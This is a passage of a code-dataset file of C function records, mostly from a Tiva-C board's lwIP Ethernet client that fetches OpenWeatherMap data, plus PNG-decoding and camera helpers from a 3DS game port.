{"docstring": "//*****************************************************************************\n//\n// Finalizes the TCP connection in client mode.\n//\n// \\param pvArg is the state data for this connection.\n// \\param psPcb is the pointer to the TCP control structure.\n// \\param psBuf is the buffer structure that holds the data for this receive\n// event.\n// \\param iErr is not used in this implementation.\n//\n// This function is called when the lwIP TCP/IP stack has completed a TCP\n// connection.\n//\n// \\return This function will return an lwIP defined error code.\n//\n//*****************************************************************************\n", "func_signal": "static err_t\nTCPReceive(void *pvArg, struct tcp_pcb *psPcb, struct pbuf *psBuf, err_t iErr)", "code": "{\n    struct pbuf *psBufCur;\n    int32_t i32Items;\n\n    if(psBuf == 0)\n    {\n        //\n        // Tell the application that the connection was closed.\n        //\n        if(g_sWeather.pfnEvent)\n        {\n            g_sWeather.pfnEvent(ETH_EVENT_CLOSE, 0, 0);\n            g_sWeather.pfnEvent = 0;\n        }\n\n        //\n        // Close out the port.\n        //\n        tcp_close(psPcb);\n\n        if(psPcb == g_sEnet.psTCP)\n        {\n            g_sEnet.psTCP = 0;\n        }\n\n        g_sEnet.eState = iEthIdle;\n\n        return(ERR_OK);\n    }\n\n    if(g_sEnet.eState == iEthQueryWait)\n    {\n        if(g_sEnet.ulRequest == WEATHER_CURRENT)\n        {\n            //\n            // Read items from the buffer.\n            //\n            i32Items = JSONParseCurrent(0, g_sWeather.psWeatherReport, psBuf);\n\n            //\n            // Make sure some items were found.\n            //\n            if(i32Items > 0)\n            {\n                if(g_sWeather.pfnEvent)\n                {\n                    g_sWeather.pfnEvent(ETH_EVENT_RECEIVE,\n                                        (void *)g_sWeather.psWeatherReport, 0);\n\n                    //\n                    // Clear the event function and return to the idle state.\n                    //\n                    g_sEnet.eState = iEthIdle;\n                }\n            }\n            else if(i32Items < 0)\n            {\n                if(g_sWeather.pfnEvent)\n                {\n                    //\n                    // This was not a valid request.\n                    //\n                    g_sWeather.pfnEvent(ETH_EVENT_INVALID_REQ, 0, 0);\n\n                    //\n                    // Clear the event function and return to the idle state.\n                    //\n                    g_sEnet.eState = iEthIdle;\n                }\n            }\n        }\n        else if(g_sEnet.ulRequest == WEATHER_FORECAST)\n        {\n            //\n            // Read items from the buffer.\n            //\n            i32Items = JSONParseForecast(0, g_sWeather.psWeatherReport, psBuf);\n\n            if(i32Items > 0)\n            {\n                if(g_sWeather.pfnEvent)\n                {\n                    g_sWeather.pfnEvent(ETH_EVENT_RECEIVE,\n                                        (void *)g_sWeather.psWeatherReport, 0);\n\n                    //\n                    // Clear the event function and return to the idle state.\n                    //\n                    g_sEnet.eState = iEthIdle;\n                }\n            }\n            else if(i32Items < 0)\n            {\n                if(g_sWeather.pfnEvent)\n                {\n                    //\n                    // This was not a valid request.\n                    //\n                    g_sWeather.pfnEvent(ETH_EVENT_INVALID_REQ, 0, 0);\n\n                    //\n                    // Clear the event function and return to the idle state.\n                    //\n                    g_sEnet.eState = iEthIdle;\n                }\n            }\n        }\n    }\n    else\n    {\n        //\n        // Go to idle state.\n        //\n        g_sEnet.eState = iEthIdle;\n    }\n\n    //\n    // Initialize the linked list pointer to parse.\n    //\n    psBufCur = psBuf;\n\n    //\n    // Free the buffers used since they have been processed.\n    //\n    while(psBufCur->len != 0)\n    {\n        //\n        // Indicate that you have received and processed this set of TCP data.\n        //\n        tcp_recved(psPcb, psBufCur->len);\n\n        //\n        // Go to the next buffer.\n        //\n        psBufCur = psBufCur->next;\n\n        //\n        // Terminate if there are no more buffers.\n        //\n        if(psBufCur == 0)\n        {\n            break;\n        }\n    }\n\n    //\n    // Free the memory space allocated for this receive.\n    //\n    pbuf_free(psBuf);\n\n    //\n    // Return.\n    //\n    return(ERR_OK);\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// Initialize the Ethernet client\n//\n// This function initializes all the Ethernet components to not configured.\n// This tells the SysTick interrupt which timer modules to call.\n//\n// \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nEthClientInit(tEventFunction pfnEvent)", "code": "{\n    uint32_t ui32User0, ui32User1;\n\n    //\n    // Initialize all the Ethernet components to not configured.  This tells\n    // the SysTick interrupt which timer modules to call.\n    //\n    HWREGBITW(&g_sEnet.ui32Flags, FLAG_TIMER_DHCP_EN) = 0;\n    HWREGBITW(&g_sEnet.ui32Flags, FLAG_TIMER_DNS_EN) = 0;\n    HWREGBITW(&g_sEnet.ui32Flags, FLAG_TIMER_TCP_EN) = 0;\n\n    g_sEnet.eState = iEthNoConnection;\n\n    g_sEnet.pfnEvent = pfnEvent;\n\n    //\n    // Convert the 24/24 split MAC address from NV ram into a 32/16 split MAC\n    // address needed to program the hardware registers, then program the MAC\n    // address into the Ethernet Controller registers.\n    //\n    FlashUserGet(&ui32User0, &ui32User1);\n\n    g_sEnet.pui8MACAddr[0] = ((ui32User0 >> 0) & 0xff);\n    g_sEnet.pui8MACAddr[1] = ((ui32User0 >> 8) & 0xff);\n    g_sEnet.pui8MACAddr[2] = ((ui32User0 >> 16) & 0xff);\n    g_sEnet.pui8MACAddr[3] = ((ui32User1 >> 0) & 0xff);\n    g_sEnet.pui8MACAddr[4] = ((ui32User1 >> 8) & 0xff);\n    g_sEnet.pui8MACAddr[5] = ((ui32User1 >> 16) & 0xff);\n\n    lwIPInit(g_ui32SysClock, g_sEnet.pui8MACAddr, 0, 0, 0, IPADDR_USE_DHCP);\n\n    //\n    // Start lwIP tick interrupt.\n    //\n    HWREGBITW(&g_sEnet.ui32Flags, FLAG_TIMER_DHCP_EN) = 1;\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// DHCP connect\n//\n// This function obtains the MAC address from the User registers, starts the\n// DHCP timer and blocks until an IP address is obtained.\n//\n// \\return None.\n//\n//*****************************************************************************\n", "func_signal": "err_t\nEthClientDHCPConnect(void)", "code": "{\n    //\n    // Check if the DHCP has already been started.\n    //\n    if(HWREGBITW(&g_sEnet.ui32Flags, FLAG_DHCP_STARTED) == 0)\n    {\n        //\n        // Set the DCHP started flag.\n        //\n        HWREGBITW(&g_sEnet.ui32Flags, FLAG_DHCP_STARTED) = 1;\n    }\n    else\n    {\n        //\n        // If DHCP has already been started, we need to clear the IPs and\n        // switch to static.  This forces the LWIP to get new IP address\n        // and retry the DHCP connection.\n        //\n        lwIPNetworkConfigChange(0, 0, 0, IPADDR_USE_STATIC);\n\n        //\n        // Restart the DHCP connection.\n        //\n        lwIPNetworkConfigChange(0, 0, 0, IPADDR_USE_DHCP);\n    }\n\n    return ERR_OK;\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// This is the code that gets called when the processor receives a fault\n// interrupt.  This simply enters an infinite loop, preserving the system state\n// for examination by a debugger.\n//\n//*****************************************************************************\n", "func_signal": "static void\nFaultISR(void)", "code": "{\n    //\n    // Enter an infinite loop.\n    //\n    while(1)\n    {\n    }\n}", "path": "boards\\ek-tm4c1294xl\\mpu_fault\\startup_ccs.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// TCP connect\n//\n// This function attempts to connect to a TCP endpoint.\n//\n// \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nEthClientTCPDisconnect(void)", "code": "{\n    //\n    // No longer have a link.\n    //\n    g_sEnet.eState = iEthNoConnection;\n\n    //\n    // Deallocate the TCP structure if it was already allocated.\n    //\n    if(g_sEnet.psTCP)\n    {\n        //\n        // Close the TCP connection.\n        //\n        tcp_close(g_sEnet.psTCP);\n        g_sEnet.psTCP = 0;\n    }\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// This is the code that gets called when the processor receives a NMI.  This\n// simply enters an infinite loop, preserving the system state for examination\n// by a debugger.\n//\n//*****************************************************************************\n", "func_signal": "static void\nNmiSR(void)", "code": "{\n    //\n    // Enter an infinite loop.\n    //\n    while(1)\n    {\n    }\n}", "path": "boards\\ek-tm4c1294xl\\mpu_fault\\startup_ccs.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// Set the proxy string for the Ethernet connection.\n//\n// \\param pcProxyName is the string used as the proxy server name.\n//\n// This function sets the current proxy used by the Ethernet connection.  The\n// \\e pcProxyName value can be 0 to indicate that no proxy is in use or it can\n// be a pointer to a string that holds the name of the proxy server to use.\n// The content of the pointer passed to \\e pcProxyName should not be changed\n// after this call as this function only stores the pointer and does not copy\n// the data from this pointer.\n//\n// \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nEthClientProxySet(const char *pcProxyName)", "code": "{\n    //\n    // Save the new proxy string.\n    //\n    g_sEnet.pcProxyName = pcProxyName;\n\n    //\n    // Reset the connection on any change to the proxy.\n    //\n    EthClientReset();\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// Send a request to the server\n//\n// \\param pcRequest request to be sent\n// \\param ui32Size length of the request to be sent. this is usually the size\n// of the request minus the termination character\n//\n// This function will send the request to the connected server\n//\n// \\return the lwIP error code.\n//\n//*****************************************************************************\n", "func_signal": "err_t\nEthClientSend(char *pcRequest, uint32_t ui32Size)", "code": "{\n    err_t eError;\n\n    eError = tcp_write(g_sEnet.psTCP, pcRequest, ui32Size,\n                       TCP_WRITE_FLAG_COPY);\n\n    //\n    //  Write data for sending (but does not send it immediately).\n    //\n    if(eError == ERR_OK)\n    {\n        //\n        // Find out what we can send and send it\n        //\n        tcp_output(g_sEnet.psTCP);\n    }\n\n    return(eError);\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// This is the code that gets called when the processor receives an unexpected\n// interrupt.  This simply enters an infinite loop, preserving the system state\n// for examination by a debugger.\n//\n//*****************************************************************************\n", "func_signal": "static void\nIntDefaultHandler(void)", "code": "{\n    //\n    // Go into an infinite loop.\n    //\n    while(1)\n    {\n    }\n}", "path": "boards\\ek-tm4c1294xl\\mpu_fault\\startup_ccs.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// Close an active connection.\n//\n//*****************************************************************************\n", "func_signal": "void\nEthClientReset(void)", "code": "{\n    //\n    // No longer have a link.\n    //\n    g_sEnet.eState = iEthNoConnection;\n\n    //\n    // Reset the flags to just enable the lwIP timer.\n    //\n    g_sEnet.ui32Flags = (1 << FLAG_TIMER_DHCP_EN);\n\n    //\n    // Reset the addresses.\n    //\n    g_sEnet.sLocalIP.addr = 0;\n    g_sEnet.sServerIP.addr = 0;\n\n    //\n    // Deallocate the TCP structure if it was already allocated.\n    //\n    if(g_sEnet.psTCP)\n    {\n        //\n        // Clear out all of the TCP callbacks.\n        //\n        tcp_sent(g_sEnet.psTCP, NULL);\n        tcp_recv(g_sEnet.psTCP, NULL);\n        tcp_err(g_sEnet.psTCP, NULL);\n\n        //\n        // Close the TCP connection.\n        //\n        tcp_close(g_sEnet.psTCP);\n        g_sEnet.psTCP = 0;\n    }\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// Gets the current weather information for a given city.\n//\n//*****************************************************************************\n", "func_signal": "int32_t\nWeatherCurrent(tWeatherSource eWeatherSource, const char *pcQuery,\n               tWeatherReport *psWeatherReport, tEventFunction pfnEvent)", "code": "{\n    int32_t i32Idx;\n\n    //\n    // If the requested source is not valid or there is no call back then\n    // just fail.\n    //\n    if((eWeatherSource != iWSrcOpenWeatherMap) || (g_sWeather.pfnEvent))\n    {\n        return (-1);\n    }\n\n    g_sWeather.pfnEvent = pfnEvent;\n    g_sWeather.psWeatherReport = psWeatherReport;\n\n    //\n    // Copy the base current request to the buffer.\n    //\n    i32Idx = MergeRequest(0, g_cWeatherRequest, sizeof(g_cWeatherRequest),\n                          false);\n\n    //\n    // Append the request.\n    //\n    i32Idx = MergeRequest(i32Idx, pcQuery, sizeof(g_sWeather.pcRequest), true);\n\n    //\n    // Append the request mode.\n    //\n    i32Idx = MergeRequest(i32Idx, g_cMode, sizeof(g_cMode), false);\n\n    //\n    // Append the App ID.\n    //\n    i32Idx = MergeRequest(i32Idx, g_cAPPIDOpenWeather,\n                          sizeof(g_cAPPIDOpenWeather), false);\n\n    //\n    // Append the \"HTTP:/1.1\" string.\n    //\n    i32Idx = MergeRequest(i32Idx, g_cHTTP11, sizeof(g_cHTTP11), false);\n\n    //\n    // Save the size of this request.\n    //\n    g_sWeather.ui32RequestSize = i32Idx;\n\n    //\n    // Connect or reconnect to port 80.\n    //\n    g_sEnet.eState = iEthTCPConnectWait;\n\n    //\n    // Current weather report request.\n    //\n    g_sEnet.ulRequest = WEATHER_CURRENT;\n\n    //\n    // Connect to server\n    //\n    if(EthClientTCPConnect(80) != ERR_OK)\n    {\n        return(-1);\n    }\n\n    return(0);\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// Periodic Tick for the Ethernet client\n//\n// This function is the needed periodic tick for the Ethernet client. It needs\n// to be called periodically through the use of a timer or systick.\n//\n// \\return None.\n//\n//*****************************************************************************\n", "func_signal": "void\nEthClientTick(uint32_t ui32TickMS)", "code": "{\n    uint32_t ui32IPAddr;\n    int32_t i32Ret;\n\n    if(HWREGBITW(&g_sEnet.ui32Flags, FLAG_TIMER_DHCP_EN))\n    {\n        lwIPTimer(ui32TickMS);\n    }\n\n    if(HWREGBITW(&g_sEnet.ui32Flags, FLAG_TIMER_DNS_EN))\n    {\n        dns_tmr();\n    }\n\n    if(HWREGBITW(&g_sEnet.ui32Flags, FLAG_TIMER_TCP_EN))\n    {\n        tcp_tmr();\n    }\n\n    //\n    // Check for loss of link.\n    //\n    if((g_sEnet.eState != iEthNoConnection) &&\n       (lwIPLocalIPAddrGet() == 0xffffffff))\n    {\n        //\n        // Reset the connection due to a loss of link.\n        //\n        EthClientReset();\n\n        //\n        // Signal a disconnect event.\n        //\n        g_sEnet.pfnEvent(ETH_EVENT_DISCONNECT, 0, 0);\n    }\n    else if(g_sEnet.eState == iEthNoConnection)\n    {\n        //\n        // Once link is detected start DHCP.\n        //\n        if(lwIPLocalIPAddrGet() != 0xffffffff)\n        {\n            EthClientDHCPConnect();\n\n            g_sEnet.eState = iEthDHCPWait;\n        }\n    }\n    else if(g_sEnet.eState == iEthDHCPWait)\n    {\n        //\n        // Get IP address.\n        //\n        ui32IPAddr = lwIPLocalIPAddrGet();\n\n        //\n        // If IP Address has not yet been assigned, update the display\n        // accordingly.\n        //\n        if((ui32IPAddr != 0xffffffff) && (ui32IPAddr != 0))\n        {\n            //\n            // Update the DHCP IP address.\n            //\n            g_sEnet.sLocalIP.addr = ui32IPAddr;\n\n            g_sEnet.eState = iEthDHCPComplete;\n\n            //\n            // Stop DHCP timer since an address has been provided.\n            //\n            HWREGBITW(&g_sEnet.ui32Flags, FLAG_DHCP_STARTED) = 0;\n        }\n    }\n    else if(g_sEnet.eState == iEthDHCPComplete)\n    {\n        if(g_sEnet.pcProxyName == 0)\n        {\n            //\n            // Resolve the host by name.\n            //\n            i32Ret = EthClientDNSResolve(\"api.openweathermap.org\");\n        }\n        else\n        {\n            //\n            // Resolve the proxy by name.\n            //\n            i32Ret = EthClientDNSResolve(g_sEnet.pcProxyName);\n        }\n\n        if(i32Ret == ERR_OK)\n        {\n            //\n            // If the address was already returned then go to idle.\n            //\n            g_sEnet.eState = iEthIdle;\n\n            //\n            // Notify the main routine of the new Ethernet connection.\n            //\n            g_sEnet.pfnEvent(ETH_EVENT_CONNECT, &g_sEnet.sLocalIP.addr, 4);\n        }\n        else if(i32Ret == ERR_INPROGRESS)\n        {\n            //\n            // If the request is pending the go to the iEthDNSWait state.\n            //\n            g_sEnet.eState = iEthDNSWait;\n        }\n    }\n    else if(g_sEnet.eState == iEthDNSWait)\n    {\n        //\n        // Check if the host name was resolved.\n        //\n        if(HWREGBITW(&g_sEnet.ui32Flags, FLAG_DNS_ADDRFOUND))\n        {\n            //\n            // Stop calling the DNS timer function.\n            //\n            HWREGBITW(&g_sEnet.ui32Flags, FLAG_TIMER_DNS_EN) = 0;\n\n            g_sEnet.eState = iEthIdle;\n\n            //\n            // Notify the main routine of the new Ethernet connection.\n            //\n            g_sEnet.pfnEvent(ETH_EVENT_CONNECT, &g_sEnet.sLocalIP.addr, 4);\n        }\n    }\n    else if(g_sEnet.eState == iEthTCPConnectWait)\n    {\n    }\n    else if(g_sEnet.eState == iEthTCPConnectComplete)\n    {\n        err_t eError;\n\n        g_sEnet.eState = iEthTCPOpen;\n\n        eError = EthClientSend(g_sWeather.pcRequest,\n                               g_sWeather.ui32RequestSize);\n\n        if(eError == ERR_OK)\n        {\n            //\n            // Waiting on a query response.\n            //\n            g_sEnet.eState = iEthQueryWait;\n        }\n        else\n        {\n            g_sEnet.eState = iEthIdle;\n        }\n    }\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// Set the current weather source.\n//\n//*****************************************************************************\n", "func_signal": "void\nWeatherSourceSet(tWeatherSource eWeatherSource)", "code": "{\n    //\n    // Save the source.\n    //\n    g_sWeather.eWeatherSource = eWeatherSource;\n    g_sWeather.eFormat = iFormatJSON;\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// Handler function when the DNS server gets a response or times out.\n//\n// \\param pcName is DNS server name.\n// \\param psIPAddr is the DNS server's IP address.\n// \\param vpArg is the configurable argument.\n//\n// This function is called when the DNS server resolves an IP or times out.\n// If the DNS server returns an IP structure that is not NULL, add the IP to\n// to the g_sEnet.sServerIP IP structure.\n//\n// \\return None.\n//\n//*****************************************************************************\n", "func_signal": "static void\nDNSServerFound(const char *pcName, struct ip_addr *psIPAddr, void *vpArg)", "code": "{\n    //\n    // Check if a valid DNS server address was found.\n    //\n    if(psIPAddr != NULL)\n    {\n        //\n        // Copy the returned IP address into a global IP address.\n        //\n        g_sEnet.sServerIP = *psIPAddr;\n\n        //\n        // Tell the main program that a DNS address was found.\n        //\n        HWREGBITW(&g_sEnet.ui32Flags, FLAG_DNS_ADDRFOUND) = 1;\n    }\n    else\n    {\n        //\n        // Disable the DNS timer.\n        //\n        HWREGBITW(&g_sEnet.ui32Flags, FLAG_TIMER_DNS_EN) = 0;\n    }\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// TCP connect\n//\n// This function attempts to connect to a TCP endpoint.\n//\n// \\return None.\n//\n//*****************************************************************************\n", "func_signal": "err_t\nEthClientTCPConnect(uint32_t ui32Port)", "code": "{\n    err_t eTCPReturnCode;\n\n    //\n    // Enable the TCP timer function calls.\n    //\n    HWREGBITW(&g_sEnet.ui32Flags, FLAG_TIMER_TCP_EN) = 1;\n\n    if(g_sEnet.psTCP)\n    {\n        //\n        // Initially clear out all of the TCP callbacks.\n        //\n        tcp_sent(g_sEnet.psTCP, NULL);\n        tcp_recv(g_sEnet.psTCP, NULL);\n        tcp_err(g_sEnet.psTCP, NULL);\n\n        //\n        // Make sure there is no lingering TCP connection.\n        //\n        tcp_close(g_sEnet.psTCP);\n    }\n\n    //\n    // Create a new TCP socket.\n    //\n    g_sEnet.psTCP = tcp_new();\n\n    //\n    // Check if you need to go through a proxy.\n    //\n    if(g_sEnet.pcProxyName != 0)\n    {\n        //\n        // Attempt to connect through the proxy server.\n        //\n        eTCPReturnCode = tcp_connect(g_sEnet.psTCP, &g_sEnet.sServerIP,\n                                     ui32Port, TCPConnected);\n    }\n    else\n    {\n        //\n        // Attempt to connect to the server directly.\n        //\n        eTCPReturnCode = tcp_connect(g_sEnet.psTCP, &g_sEnet.sServerIP,\n                                     ui32Port, TCPConnected);\n    }\n\n    return(eTCPReturnCode);\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// Finalizes the TCP connection in client mode.\n//\n// \\param pvArg is the state data for this connection.\n// \\param psPcb is the pointer to the TCP control structure.\n// \\param iErr is not used in this implementation.\n//\n// This function is called when the lwIP TCP/IP stack has completed a TCP\n// connection.\n//\n// \\return This function will return an lwIP defined error code.\n//\n//*****************************************************************************\n", "func_signal": "static err_t\nTCPConnected(void *pvArg, struct tcp_pcb *psPcb, err_t iErr)", "code": "{\n    //\n    // Check if there was a TCP error.\n    //\n    if(iErr != ERR_OK)\n    {\n        //\n        // Clear out all of the TCP callbacks.\n        //\n        tcp_sent(psPcb, NULL);\n        tcp_recv(psPcb, NULL);\n        tcp_err(psPcb, NULL);\n\n        //\n        // Close the TCP connection.\n        //\n        tcp_close(psPcb);\n\n        if(psPcb == g_sEnet.psTCP)\n        {\n            g_sEnet.psTCP = 0;\n        }\n\n        //\n        // And return.\n        //\n        return (ERR_OK);\n    }\n\n    //\n    // Setup the TCP receive function.\n    //\n    tcp_recv(psPcb, TCPReceive);\n\n    //\n    // Setup the TCP error function.\n    //\n    tcp_err(psPcb, TCPError);\n\n    //\n    // Setup the TCP sent callback function.\n    //\n    tcp_sent(psPcb, TCPSent);\n\n    //\n    // Connection is complete.\n    //\n    g_sEnet.eState = iEthTCPConnectComplete;\n\n    //\n    // Return a success code.\n    //\n    return(ERR_OK);\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// Returns the MAC address for the Tiva Ethernet controller.\n//\n// \\param pui8MACAddr is the 6 byte MAC address assigned to the Ethernet\n// controller.\n//\n// This function will read and return the MAC address for the Ethernet\n// controller.\n//\n// \\return Returns the weather server IP address for this interface.\n//\n//*****************************************************************************\n", "func_signal": "void\nEthClientMACAddrGet(uint8_t *pui8MACAddr)", "code": "{\n    int32_t iIdx;\n\n    for(iIdx = 0; iIdx < 6; iIdx++)\n    {\n        pui8MACAddr[iIdx] = g_sEnet.pui8MACAddr[iIdx];\n    }\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "//*****************************************************************************\n//\n// Gets the daily forecast for a given city.\n//\n//*****************************************************************************\n", "func_signal": "int32_t\nWeatherForecast(tWeatherSource eWeatherSource, const char *pcQuery,\n                tWeatherReport *psWeatherReport, tEventFunction pfnEvent)", "code": "{\n    int32_t i32Idx;\n    const char pcCount[] = \"&cnt=1\";\n\n    //\n    // If the requested source is not valid or there is no call back then\n    // just fail.\n    //\n    if((eWeatherSource != iWSrcOpenWeatherMap) || (g_sWeather.pfnEvent))\n    {\n        return (-1);\n    }\n\n    g_sWeather.pfnEvent = pfnEvent;\n    g_sWeather.psWeatherReport = psWeatherReport;\n\n    //\n    // Connect or reconnect to port 80.\n    //\n    g_sEnet.eState = iEthTCPConnectWait;\n\n    //\n    // Copy the base forecast request to the buffer.\n    //\n    i32Idx = MergeRequest(0, g_cWeatherRequestForecast,\n                          sizeof(g_cWeatherRequestForecast), false);\n\n    //\n    // Append the request.\n    //\n    i32Idx = MergeRequest(i32Idx, pcQuery, sizeof(g_sWeather.pcRequest),\n                          true);\n\n    //\n    // Append the request mode.\n    //\n    i32Idx = MergeRequest(i32Idx, g_cMode, sizeof(g_cMode), false);\n\n    //\n    // Append the count.\n    //\n    i32Idx = MergeRequest(i32Idx, pcCount, sizeof(pcCount), false);\n\n    //\n    // Append the App ID.\n    //\n    i32Idx = MergeRequest(i32Idx, g_cAPPIDOpenWeather,\n                          sizeof(g_cAPPIDOpenWeather), false);\n\n    //\n    // Append the \"HTTP:/1.1\" string.\n    //\n    i32Idx = MergeRequest(i32Idx, g_cHTTP11, sizeof(g_cHTTP11), false);\n\n    //\n    // Forcast weather report request.\n    //\n    g_sEnet.ulRequest = WEATHER_FORECAST;\n\n    if(EthClientTCPConnect(80) != ERR_OK)\n    {\n        return(-1);\n    }\n\n    //\n    // Save the size of the request.\n    //\n    g_sWeather.ui32RequestSize = i32Idx;\n\n    return(0);\n}", "path": "boards\\ek-tm4c1294xl\\enet_weather\\eth_client.c", "repo_name": "yuvadm/tiva-c", "stars": 164, "license": "None", "language": "c", "size": 77807}
{"docstring": "/*resize and give all new elements the value*/\n", "func_signal": "static unsigned ucvector_resizev(ucvector* p, size_t size, unsigned char value)", "code": "{\n  size_t oldsize = p->size, i;\n  if(!ucvector_resize(p, size)) return 0;\n  for(i = oldsize; i < size; ++i) p->data[i] = value;\n  return 1;\n}", "path": "source\\gfx\\lodepng.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "/*LODEPNG_COMPILE_ANCILLARY_CHUNKS*/\n", "func_signal": "void lodepng_info_init(LodePNGInfo* info)", "code": "{\n  lodepng_color_mode_init(&info->color);\n  info->interlace_method = 0;\n  info->compression_method = 0;\n  info->filter_method = 0;\n#ifdef LODEPNG_COMPILE_ANCILLARY_CHUNKS\n  info->background_defined = 0;\n  info->background_r = info->background_g = info->background_b = 0;\n\n  LodePNGText_init(info);\n  LodePNGIText_init(info);\n\n  info->time_defined = 0;\n  info->phys_defined = 0;\n\n  LodePNGUnknownChunks_init(info);\n#endif /*LODEPNG_COMPILE_ANCILLARY_CHUNKS*/\n}", "path": "source\\gfx\\lodepng.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "//TEMP\n", "func_signal": "void initCamera(camera_s* c)", "code": "{\n\tif(!c)return;\n\n\tinitProjectionMatrix((float*)c->projection, 1.3962634f, 240.0f/400.0f, 0.01f, 1000.0f);\n\tloadIdentity44((float*)c->orientation);\n\tc->position=vect3Df(0.0f, 0.0f, 0.0f);\n\n\tnormGravityVector=vect3Df(0.0f, -1.0f, 0.0f); //TEMP\n}", "path": "source\\game\\camera.c", "repo_name": "smealum/portal3DS", "stars": 192, "license": "None", "language": "c", "size": 2567}
{"docstring": "/*Automatically chooses color type that gives smallest amount of bits in the\noutput image, e.g. grey if there are only greyscale pixels, palette if there\nare less than 256 colors, ...\nUpdates values of mode with a potentially smaller color model. mode_out should\ncontain the user chosen color model, but will be overwritten with the new chosen one.*/\n", "func_signal": "unsigned lodepng_auto_choose_color(LodePNGColorMode* mode_out,\n                                   const unsigned char* image, unsigned w, unsigned h,\n                                   const LodePNGColorMode* mode_in)", "code": "{\n  LodePNGColorProfile prof;\n  unsigned error = 0;\n  unsigned i, n, palettebits, grey_ok, palette_ok;\n\n  lodepng_color_profile_init(&prof);\n  error = lodepng_get_color_profile(&prof, image, w, h, mode_in);\n  if(error) return error;\n  mode_out->key_defined = 0;\n\n  if(prof.key && w * h <= 16) {\n    prof.alpha = 1; /*too few pixels to justify tRNS chunk overhead*/\n    if(prof.bits < 8) prof.bits = 8; /*PNG has no alphachannel modes with less than 8-bit per channel*/\n  }\n  grey_ok = !prof.colored && !prof.alpha; /*grey without alpha, with potentially low bits*/\n  n = prof.numcolors;\n  palettebits = n <= 2 ? 1 : (n <= 4 ? 2 : (n <= 16 ? 4 : 8));\n  palette_ok = n <= 256 && (n * 2 < w * h) && prof.bits <= 8;\n  if(w * h < n * 2) palette_ok = 0; /*don't add palette overhead if image has only a few pixels*/\n  if(grey_ok && prof.bits <= palettebits) palette_ok = 0; /*grey is less overhead*/\n\n  if(palette_ok)\n  {\n    unsigned char* p = prof.palette;\n    lodepng_palette_clear(mode_out); /*remove potential earlier palette*/\n    for(i = 0; i != prof.numcolors; ++i)\n    {\n      error = lodepng_palette_add(mode_out, p[i * 4 + 0], p[i * 4 + 1], p[i * 4 + 2], p[i * 4 + 3]);\n      if(error) break;\n    }\n\n    mode_out->colortype = LCT_PALETTE;\n    mode_out->bitdepth = palettebits;\n\n    if(mode_in->colortype == LCT_PALETTE && mode_in->palettesize >= mode_out->palettesize\n        && mode_in->bitdepth == mode_out->bitdepth)\n    {\n      /*If input should have same palette colors, keep original to preserve its order and prevent conversion*/\n      lodepng_color_mode_cleanup(mode_out);\n      lodepng_color_mode_copy(mode_out, mode_in);\n    }\n  }\n  else /*8-bit or 16-bit per channel*/\n  {\n    mode_out->bitdepth = prof.bits;\n    mode_out->colortype = prof.alpha ? (prof.colored ? LCT_RGBA : LCT_GREY_ALPHA)\n                                     : (prof.colored ? LCT_RGB : LCT_GREY);\n\n    if(prof.key && 